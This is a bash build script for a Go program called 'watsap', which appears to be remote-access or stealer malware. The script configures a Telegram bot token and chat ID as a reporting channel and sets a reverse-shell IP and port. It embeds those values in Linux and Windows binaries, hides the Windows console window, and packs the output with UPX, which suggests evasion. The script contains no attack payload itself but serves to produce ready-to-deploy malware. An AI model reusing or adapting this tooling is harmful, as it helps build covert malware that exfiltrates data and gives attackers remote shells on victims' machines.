#!/bin/bash
set -euo pipefail
cd watsap

# Function to check if a command is available
function Test-Bin {
    local command=$1
    local installUrl=$2

    if ! command -v "$command" &>/dev/null; then
        echo "$command is not installed. Please install it from $installUrl"
        exit 1
    fi
}

# create .env template
function Create_env {
    cat > ../.env <<EOF
# Set environment variables
export TG_BOT_TOKEN=""
export TG_CHAT_ID=""
export RSHELL_IP=""
export RSHELL_PORT=""
EOF
}

# load .env file. create template if not exists
function Load_env {
    if [ ! -f ../.env ]; then
        echo ".env file not found"
        echo "Creating .env file"
        echo "Please fill in the required environment variables"
        Create_env
    else 
        source ../.env
        echo "Setting environment variables"
        echo "---------------------------------------"
        echo Telegram Bot Token: $TG_BOT_TOKEN
        echo Telegram Channel ID: $TG_CHAT_ID
        echo Rshell IP: $RSHELL_IP
        echo RShell Port: $RSHELL_PORT
        echo "---------------------------------------"
    fi
}

# create output directory
function Create_output_dir {
    if [ ! ../dist ]; then
        mkdir -p ../dist
    fi
}

# Genral clean up
function Clean {
    rm -f ../dist/watsap-* ../dist/*efender* ../dist/*temp*
}

Clean

echo "Checking required binaries..."
Test-Bin go "https://golang.org/dl/"
Test-Bin upx "https://upx.github.io/"
echo "Loading environment variables..."
Load_env
echo "Creating output directory..."
Create_output_dir

# Common flags for build
commonFlags="-X 'watsap/utils/config.TG_BOT_TOKEN=$TG_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID=$TG_CHAT_ID'"
debugFlags="$commonFlags"
releaseFlags="$commonFlags -w -s"
win_releaseFlags="$commonFlags -w -s -H=windowsgui"

# build commands
build_linux="GOOS=linux GOARCH=amd64 go build -ldflags '$releaseFlags' -o ../dist/watsap-linux-amd64.bin ."
build_windows="GOOS=windows GOARCH=amd64 go build -ldflags '$win_releaseFlags' -o ../dist/watsap-windows-amd64.exe ."
build_linux_debug="GOOS=linux GOARCH=amd64 go build -ldflags '$debugFlags' -o ../dist/watsap-linux-amd64-debug.bin ."
build_windows_debug="GOOS=windows GOARCH=amd64 go build -ldflags '$debugFlags' -o ../dist/watsap-windows-amd64-debug.exe ."

# ask user for build type
echo "Select build type"
echo "1. Release"
echo "2. Debug"
read -p "Enter your choice: " build_type

echo "Build type selected: $build_type"

case $build_type
    in
    1)
        clear
        echo "Building release version"
        eval $build_linux
        echo "Built Linux binary"
        eval $build_windows
        echo "Built Windows binary"
        echo "Compressing binaries"
        upx -9 -q -f --ultra-brute --no-owner ../dist/*.exe ../dist/*.bin > /dev/null
        echo "Compression completed"
        ls ../dist/*.exe 
        ls ../dist/*.bin
        echo "Build complete"
        ;;
    2)
        clear
        echo "Building debug version"
        eval $build_linux_debug
        echo "Built Linux debug binary"
        eval $build_windows_debug
        echo "Built Windows debug binary"
        echo "Build complete"
        ls ../dist/*.exe 
        ls ../dist/*.bin

        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

echo "Build script finished."
